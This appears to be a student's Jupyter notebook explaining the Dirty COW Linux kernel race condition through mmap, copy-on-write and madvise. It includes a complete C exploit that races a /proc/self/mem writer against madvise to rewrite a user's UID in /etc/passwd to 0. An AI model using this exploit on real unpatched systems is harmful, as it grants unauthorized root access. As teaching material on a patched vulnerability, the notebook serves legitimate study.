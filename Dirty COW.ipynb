{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Dirty COW Vulnerabilities"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Dirty COW race condition was first discovered and exploited in 2016 as a Linux Kernel bug. The bug was latent in linux kernel for 9 years prior to its disclosure. The exploit allows attackers to modify any protected file, even though these files are only readable to them. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Memory Mapping \n",
    "`mmap()` is a POSIX-compliant system call that maps files or devices into memory. Default mapping type is file-backed mapping, which maps an area of a process' virtual memory to files; reading from the mapped area causes the file to be read. \n",
    "```c\n",
    "#include <sys/mman.h>\n",
    "#include <fcntl.h>\n",
    "#include <sys/stat.h>\n",
    "#include <string.h>\n",
    "\n",
    "int main() \n",
    "{\n",
    "    struct stat st;\n",
    "    char content[20];\n",
    "    char *new_content = \"New Content\";\n",
    "    void *map;\n",
    "    \n",
    "    int f = open(\"./zzz\", O_RDWR); \n",
    "    fstat(f, &st);\n",
    "    // map the entire file to memory. \n",
    "    map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, f, 0);\n",
    "    //read 10 bytes from the file via mapped memory\n",
    "    memcpy((void*) content, map, 10);  \n",
    "    printf(\"read: %s\\n\", content);\n",
    "    \n",
    "    //write to the file via mapped memory\n",
    "    memcpy(map+5, new_content, strlen(new_content)); \n",
    "    \n",
    "    //clean up\n",
    "    munmap(map, st.st_size);\n",
    "    close(f);\n",
    "    return 0; \n",
    "}\n",
    "```\n",
    "#### Explanation of lines:\n",
    "`map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, f, 0); `\n",
    "* The first argument specifies starting address of mapped memory, NULL means kernel picks it.\n",
    "* Second argument specifies the size of the mapped memory.\n",
    "* Third argument specifies whether meomry is readable , writable. It should match the mode specified in the previous `open()` system call.\n",
    "* The fourth argument determines whether an update to the mapping is visible to other processes mapping the same region, and whether the update is carried through to the underlying file. `MAP_SHARE` means visible, wheresas `MAP_RPVIATE` not. \n",
    "* The fifth argument specifies file that needs to be mapped.\n",
    "* sixth argument specifies an offset, indicating from where inside the file mapping should start.\n",
    "\n",
    "`memcpy((void*)content, map, 10);`\n",
    "`memcpy(map+5, new_content, strlen(new_content));`\n",
    "* Once the mapped memory is created, we can acess the memory region instead of the file directly. \n",
    "* we can read from the memory, as specifying the buffer pointer in arg1. \n",
    "* we can also write to the memory, as specified in the buffer in arg2.\n",
    "\n",
    "memory mapping is used mostly for Interprocess Communication. Processes sometimes have to share the same memory, and the mapped memory behaves like the shared memory between two processes. \n",
    "\n",
    "#### MAP_SHARED, MAP_PRIVATE and Copy on Write \n",
    "`mmap()` system call:\n",
    "* create a new mapping in the virtual address space of the calling process \n",
    "* when it is used on a file, file content will be loaded into physical memory \n",
    "* physical memory will then be loaded into process's virtual memory, mostly through paging.\n",
    "\n",
    "When multiple processes map the same file to mempry, although they can map the file to different virutal memory address, the physical memory that holds the file is fixed. <br>\n",
    "* if the `MAP_SHARED` flag is on, when writing to the mapped memory, the physical memory will also be updated and visible to other processes. \n",
    "* If `MAP_PRIVATE` flag is on, the file is mapped to the memory private to the calling process, so the changes will not be visible to other processes, nor will the change take place in the underlying file (on physical memory level). This mostly measns that the calling process has a _private copy_ of the file in its virtual memory. \n",
    "    * The content of the file needs to be copied into the private memory region, but it is often delayed until needed.\n",
    "    * Therefore, memory mapped with `MAP_PRIVATE` still initially points to the physical memory. \n",
    "    * The private copy is performed only when the process requires to write to memory, in which circumstance, the OS kernel will allocate new memory for the task. \n",
    "    * The OS will then update the page table of the process, so the mapped virtual memory will now point to the new phuysical memory, and any read and write will be redirected to this memory location. (private copy) \n",
    "![map](./image_files/MAP.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Copy on Write\n",
    "__COW(Copy on Write)__ is the behavior described above. It is an optimization technique that allows virtual pages of memory in different processes to map to the same physical techniques that allow vritual page of memory in different processes to map to the same physical memory pages if they have identical content. <br>\n",
    "COW is widely used in modern operating systems. Another example is the `fork()` system call, where the child process first have a copy of the parent's process. \n",
    "* The copy is time consuming so OS often delay until it is absolutely mecessary (procrastination). \n",
    "* The OS let the child process share the parent process's memory by making their page entries point to the same physical memory. \n",
    "* The page entries for both processes are normally set to read-only to prevent writing to memory. \n",
    "* When one process tries to write to the memory, exception will be raised, and OS will begin to allocate new physical memory for child process (Copy the contents from parent process, and change child's page table, so that each process's page table points to its own private copy of memory) \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Discard the Copied Memory \n",
    "After a program gets its private copy of the mapped memory, it can use a system call `madvise()` to further advise the kernel regarding the memory. The system call is defined as:\n",
    "```c\n",
    "int madvise(void *addr, size_t length, int advice); \n",
    "```\n",
    "It gives advices or directions to the kernel about the memory from address `addr` to `addr + length`. The `MADV_DONTNEED` advice is used in Dirty COW attack. When this flag is used as the advice, we tell the kernel that we do not need the claimed part of the address anymore. The kernel will free the resource of the claimed address. <br>\n",
    "However, if the pages we want to discard originally belong to some mapped memory, then after we use `madvise()` with `MADV_DONTNEED` advice, the process' page table will point back to the original physical memory. <br> \n",
    "This is a vulnerability, because the process might can still write to the physical memory. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### A Read-only Scenario \n",
    "The following scenario is a well-defined copy when write scenario. <br> \n",
    "Suppose we have a read-only file that cannot be written using `memcpy` and can only be opened via `O_RDONLY` flag and accessed via `PROT_READ` flag. However, in linux, if a file is mapped using `MAP_PRIVATE`, the OS can make an exception and write to mapped memory via `write()` call, which is theoretically safe since it writes to the private copy. \n",
    "\n",
    "```c\n",
    "#include <stdio.h>\n",
    "#include <sys/mman.h>\n",
    "#include <fcntl.h>\n",
    "#include <unistd.h>\n",
    "#include <string.h>\n",
    "\n",
    "int main(int argc, char** argv) \n",
    "{\n",
    "    char *content = \"**New Content**\"; \n",
    "    char buffer[30];\n",
    "    struct stat st; \n",
    "    void *map;\n",
    "    \n",
    "    int f=open(\"/zzz\", O_RDONLY);\n",
    "    fstat(f, &st);\n",
    "    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0); //MAP_PRIVATE flag on\n",
    "    \n",
    "    //open process's memory pseudo-file \n",
    "    int fm = open(\"/proc/self/mem\", O_RDWR); \n",
    "    \n",
    "    //start at 5th byte from beginning \n",
    "    lseek(fm, (off_t) map + 5, SEEK_SET);\n",
    "    \n",
    "    // write to the memory\n",
    "    write(fm, content, strlen(content));\n",
    "    \n",
    "    //check whether the write is successful \n",
    "    memcpy(buffer, map, 29); \n",
    "    printf(\"content after write: %s\\n\", buffer);\n",
    "    \n",
    "    //check contents after madvise \n",
    "    madvise(map, st.st_size, MADV_DONTNEED);\n",
    "    memcpy(buffer, map, 29); \n",
    "    printf(\"Content after madvise: %s\\n\", buffer);     \n",
    "    return 0; \n",
    "}\n",
    "\n",
    "```\n",
    "\n",
    "The write will only be on the private copy of the mapped memory, not directly on the mapped memory itself. So if we run the program, mapped memory will be modified. After the `madvise` call, the print statement will print the content of the file, which is not changed, and this shows that after the `madvise` with `MDAV_DONTNEED` flag, the private copy is abolished and the page table points back to the original mapped memory (the file's physical memory)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Dirty COW Exploit "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the above scenario, we have shown that `write` can be used to write to the mapped memory. For the memory of the copy-on-write type, the system call has to perform three essential steps:\n",
    "* Make a copy of the mapped memory\n",
    "* Update the page table, so virtual memory now points to the newly created physical memory\n",
    "* write to the memory \n",
    "These three steps are not atomic and may cause race conditions. The execution of one step may be interrupted by other threads or processes. If, for example, between step 2 and 3, we use the `madvise()` with `MADV_DONTNEED` advice, we can discard the private copy of the mapped memory, so page table can point back to the original mapped memory again. If in this case, we are able to write directly to the physical memory holding the file content. This causes a write to the read-only file. <br> \n",
    "![COW](./image_files/COW.png)\n",
    "The `write` system call checks in the beginning about protection about the mapped memory, but only in the beginning. After page table update and copy to the private virtual memory, the write no longer checks. If in the third step, `write` checks again, the problem can be avoided. <br>\n",
    "For the exploit, therefore, we need two threads\n",
    "* one trying to write to the mapped memory via `write()` \n",
    "* the other trying to discard the private copy of the mapped memory using `madvise()` \n",
    "If the desired execution becomes as shown in the figure above (`madvise()` between Step B and Step C), we trigger the race condition. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step1: Selecting /etc/passwd as Target File\n",
    "the goal is to change the current user's privilege to 0, which represents root privilege. \n",
    "suppose the current user is `testcow`.\n",
    "```\n",
    "cat /etc/passwd | grep testcow \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 2: Set up Memory Mapping and Threads \n",
    "We need to first map the target file into memory. Then create the two threads we talked about above to try to reach race conditions. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```c\n",
    "#include <sys/mman.h>\n",
    "#include <fcntl.h>\n",
    "#include <pthread.h>\n",
    "#include <sys/stat.h>\n",
    "#include <string.h>\n",
    "\n",
    "void *map;\n",
    "\n",
    "\n",
    "//thread one: write thread \n",
    "// tries to replace testcow:x:1001 with testcow:x:0000 \n",
    "void *writeThread(void *arg)\n",
    "{\n",
    "    char *content = \"testcow:x:0000\"; \n",
    "    off_t offset = (off_t) arg;\n",
    "    int f = open(\"/proc/self/mem\", O_RDWR);\n",
    "    while (1) {\n",
    "        //move the file pointer to the corresponding position \n",
    "        lseek(f, offset, SEEK_SET); \n",
    "        write(f, content, strlen(content));\n",
    "    }\n",
    "}\n",
    "\n",
    "//thread two: madvise thread \n",
    "// discard the previous mapped memory\n",
    "void *madviseThread(void *arg)\n",
    "{\n",
    "    int file_size = (int) arg;\n",
    "    while(1) \n",
    "    {\n",
    "        madvise(map, file_size, MADV_DONTNEED); \n",
    "    }\n",
    "}\n",
    "\n",
    "//main thread\n",
    "int main(int argc, char** argv)\n",
    "{\n",
    "    pthread_t pth1, pth2;\n",
    "    struct stat st;\n",
    "    int file_size;\n",
    "    \n",
    "    int f = open(\"/etc/passwd\", O_RDONLY);\n",
    "    \n",
    "    fstat(f, &st); \n",
    "    file_size = st.st_size; \n",
    "    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);\n",
    "    char *position = strstr(map, \"testcow:x:1001\");\n",
    "    \n",
    "    //two threads in parallel\n",
    "    pthread_create(&pth1, NULL, madviseThread, (void *)file_size);\n",
    "    pthread_create(&pth2, NULL, writeThread, position); \n",
    "    \n",
    "    //join\n",
    "    pthread_join(pth1, NULL);\n",
    "    pthread_join(pth2, NULL);\n",
    "    return 0;\n",
    "\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For whether the test has succeeded, the user needs to press `Ctrl-C` to terminate after several seconds and try to view the content of the passwd file. Successful exploit will make user `testcow` a root privileged user."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__This vulnerability has already been fixed in Linux Kernel__. \n",
    "However, we can see, from the recent __spectre__ and __meltdown__ exploit from the Intel chips, that __Plenty of Exploits are due to performance design issues__. Here the Linux Copy-on-Write and the Intel's Out-of-Execution are all mechanisms that either delay or advance in event: I think this leaves room for further zero-day exploit for systems. "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
